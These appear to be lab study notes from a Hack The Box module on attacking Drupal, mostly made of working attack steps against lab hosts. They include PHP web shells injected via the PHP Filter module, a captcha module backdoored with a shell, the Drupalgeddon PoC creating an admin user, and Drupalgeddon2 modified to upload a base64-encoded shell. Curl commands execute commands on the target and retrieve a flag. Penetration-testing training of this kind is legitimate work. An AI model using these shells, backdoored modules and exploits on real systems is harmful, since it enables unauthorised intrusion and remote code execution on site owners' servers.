---
description: >-
  Obtaining a shell on a Drupal host via the admin console is not as easy as
  just editing a PHP file found within a theme or uploading a malicious PHP
  script.
---

# Attacking Drupal

###

## Leveraging the PHP Filter Module

* Drupal <mark style="color:red;">**older than**</mark> <mark style="color:red;">**version 8**</mark> could log in as admin and enable PHP filter which allows us to embed PHP code/snippets to be evaluated

<figure><img src="https://academy.hackthebox.com/storage/modules/113/drupal_php_module.png" alt=""><figcaption><p>http://drupal-qa.inlanefreight.local/#overlay=admin/modules</p></figcaption></figure>

tick the check box next to the module and scroll down to `Save configuration`.

Then, go to Content -> Add content -> create a `Basic page`.

* We can now create a page with a malicious PHP snippet

```php
<?php
system($_GET['dcfdd5e021a869fcc6dfaef8bf31377e']);
?>
```

<figure><img src="https://academy.hackthebox.com/storage/modules/113/basic_page_shell_7v2.png" alt=""><figcaption><p>http://drupal-qa.inlanefreight.local/#overlay=node/add/page</p></figcaption></figure>

* make sure to set `Text format` drop-down to `PHP code`
* we will be redirected to the new page after save

```shell-session
curl -s http://drupal-qa.inlanefreight.local/node/3?dcfdd5e021a869fcc6dfaef8bf31377e=id | grep uid | cut -f4 -d">"

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

* For drupal <mark style="color:red;">**after version 8**</mark>, we would have to install the module ourselves.

Get the most recent version of the module from Drupal website

```shell-session
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Once downloaded go to `Administration` > `Reports` > `Available updates`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/install_module.png" alt=""><figcaption><p>Installing module</p></figcaption></figure>

click on `Browse,` select the file from the directory we downloaded it to, and then click `Install`.

Once installed, click Content > create new basic page and add the PHP snippet.

## Uploading a Backdoored Module

* users with appropriate permissions can upload a new module
* A backdoored module can be created by adding a shell to an existing module.
* Modules can be found on the drupal.org website.

The following example will be based on the captcha module

Download the archive and extract its contents.

```bash
wget --no-check-certificate  https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
tar xvf captcha-8.x-1.2.tar.gz
```

Create a PHP web shell with the contents:

```php
<?php
system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);
?>
```

create a .htaccess file to give ourselves access to the folder

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

* The configuration above will apply rules for the / folder

Copy both of these files to the captcha folder and create an archive.

```bash
mv shell.php .htaccess captcha
tar cvf captcha.tar.gz captcha/

captcha/
captcha/.travis.yml
captcha/README.md
captcha/captcha.api.php
captcha/captcha.inc
captcha/captcha.info.yml
captcha/captcha.install

<SNIP>
```

(If we have Administrative privilege)&#x20;

* click on `Manage` and then `Extend` on the sidebar.
* click on the `+ Install new module` button
* Browse to the backdoored Captcha archive and click `Install`.

<figure><img src="https://academy.hackthebox.com/storage/modules/113/module_installed.png" alt=""><figcaption><p>http://drupal.inlanefreight.local/core/authorize.php</p></figcaption></figure>

Once the installation succeeds, browse to `/modules/captcha/shell.php` to execute commands.

```shell-session
curl -s drupal.inlanefreight.local/modules/captcha/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## Leveraging Known Vulnerabilities

Drupal has 3 serious code execution vulnerabilities known as `Drupalgeddon`

* [CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005) -> Drupalgeddon, affects **versions 7.0 up to 7.31** and was **fixed in version 7.32**. This was a **pre-authenticated SQL injection** flaw that could be used to upload a malicious form or create a new admin user.
* [CVE-2018-7600](https://www.drupal.org/sa-core-2018-002) -> Drupalgeddon2, is a **remote code execution** vulnerability, which affects versions of Drupal prior to **7.58 and 8.5.1**. The vulnerability occurs due to insufficient input sanitization during user registration, **allowing system-level commands to be maliciously injected**.
* [CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/) -> Drupalgeddon3, is a remote code execution vulnerability that affects multiple versions of **Drupal 7.x and 8.x**. This flaw **exploits improper validation in the Form API**.

### Drupalgeddon

Let's try **adding a new admin user** with this [PoC](https://www.exploit-db.com/exploits/34992) script. Once an admin user is added, we could log in and enable the `PHP Filter` module to achieve remote code execution.

```shell-session
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd

<SNIP>

[!] VULNERABLE!

[!] Administrator user created!

[*] Login: hacker
[*] Pass: pwnd
[*] Url: http://drupal-qa.inlanefreight.local/?q=node&destination=node
```

<figure><img src="https://academy.hackthebox.com/storage/modules/113/drupalgeddon.png" alt=""><figcaption><p>We are now admin</p></figcaption></figure>

we could obtain a shell through the various means discussed previously

### Drupalgeddon2

We can use [this](https://www.exploit-db.com/exploits/44448) PoC to confirm this vulnerability.

```shell-session
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/hello.txt
```

check quickly with `cURL` and see that the `hello.txt` file was indeed uploaded.

```shell-session
curl -s http://drupal-dev.inlanefreight.local/hello.txt

;-)
```

modify the script to gain remote code execution by uploading a malicious PHP file.

```php
echo '<?php system($_GET[fe8edbabc5c5c9b7b764504cd22b17af]);?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K
```

```shell-session
 echo "PD9waHAgc3lzdGVtKCRfR0VUW2ZlOGVkYmFiYzVjNWM5YjdiNzY0NTA0Y2QyMmIxN2FmXSk7Pz4K" | base64 -d | tee exploit.php
```

Run the modified exploit script to upload our malicious PHP file.

```shell-session
python3 drupalgeddon2.py 

################################################################
# Proof-Of-Concept for CVE-2018-7600
# by Vitalii Rudnykh
# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
# https://github.com/a2u/CVE-2018-7600
################################################################
Provided only for educational or information purposes

Enter target url (example: https://domain.ltd/): http://drupal-dev.inlanefreight.local/

Check: http://drupal-dev.inlanefreight.local/mrb3n.php
```

```shell-session
curl http://drupal-dev.inlanefreight.local/mrb3n.php?fe8edbabc5c5c9b7b764504cd22b17af=id

uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Drupalgeddon3

\<The module teaches metasploite method>

## Assessment

Work through all of the examples in this section and gain RCE multiple ways via the various Drupal instances on the target host. When you are done, submit the contents of the flag.txt file in the /var/www/drupal.inlanefreight.local directory.

* Use Drupalgeddon 2 and modify the exploite by adding php shell payload.

```
curl http://drupal-dev.inlanefreight.local/shell.php?fe8edbabc5c5c9b7b764504cd22b17af=cat%20../drupal.inlanefreight.local/flag_6470e394cbf6dab6a91682cc8585059b.txt
DrUp@l_drUp@l_3veryWh3Re!
```







